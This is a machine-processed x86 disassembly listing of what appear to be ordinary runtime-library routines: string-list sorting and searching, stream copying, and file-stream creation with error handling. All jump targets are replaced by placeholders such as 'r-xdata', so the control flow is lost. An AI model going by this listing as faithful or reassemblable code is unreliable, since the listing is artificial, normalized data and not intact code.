lea eax [ ebx + 0xc ]
mov edx esi
call sub_405a20
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41ba38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ba7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40419c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba82
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41ba88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bb3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b074
xor edx edx
push ebp
push sub_41bb1f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb26
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404094
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41bb4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bbc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41fca0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41fca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbc9
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41fd48
inc esi
dec ebx
jne r-xdata
sub_41bbf4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41bc10
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aeac
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a58
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41bc78
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b228
jmp r-xdata
sub_41bd14
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a58
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41bd54
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4029c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b44
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41bdc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41b228
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41be1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41be1c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41be40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41beb8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ff8
pop edi
pop esi
pop ebx
retn
sub_41bef4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41bf1c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41bf50
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b4f0
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41bf9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b228
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41bff0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41bf1c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ff8
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4029c0
sub_41c068
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41b228
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ff8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41c0c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41b228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41c104
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41be1c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c104
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41c1b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41c210
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41c104
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41c264
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41c298
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41c2fc
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41c350
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
mov esp ebp
pop ebp
retn
sub_41c39c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40319c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41c350
pop ecx
mov eax [ ebx ]
call sub_4031e0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41c350
pop ecx
sub_41c420
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41c490
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_41c4c8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
sub_41c500
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41c284
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027c4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41c5dc
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c5e3
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4027e4
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41c490
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41c4c8
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41c5f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc78
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c644
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41ecac
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c64b
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_41c654
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c6b0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40894c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41c6f0
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d2c8
pop ebx
pop ebp
retn 0x8
sub_41c718
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41c75c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c75c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41c885
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403578
movzx edx di
mov eax esi
call sub_408870
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c654
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4088ec
mov ecx eax
xor edx edx
mov eax ebx
call sub_41c654
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c88c
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fc8
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408b04
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b414
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408b04
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b414
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
jmp r-xdata
sub_41c88c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41c8b0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
call sub_408984
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41c8ec
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4029c0
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41c924
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41c948
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_41c974
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41c98c
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41c284
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41c490
sub_41c9c4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41c8e4
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41c9ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41c9c4
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41ca18
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406e48
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406e2c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406e1c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
test ecx ecx
jne r-xdata
sub_41caa4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4029c0
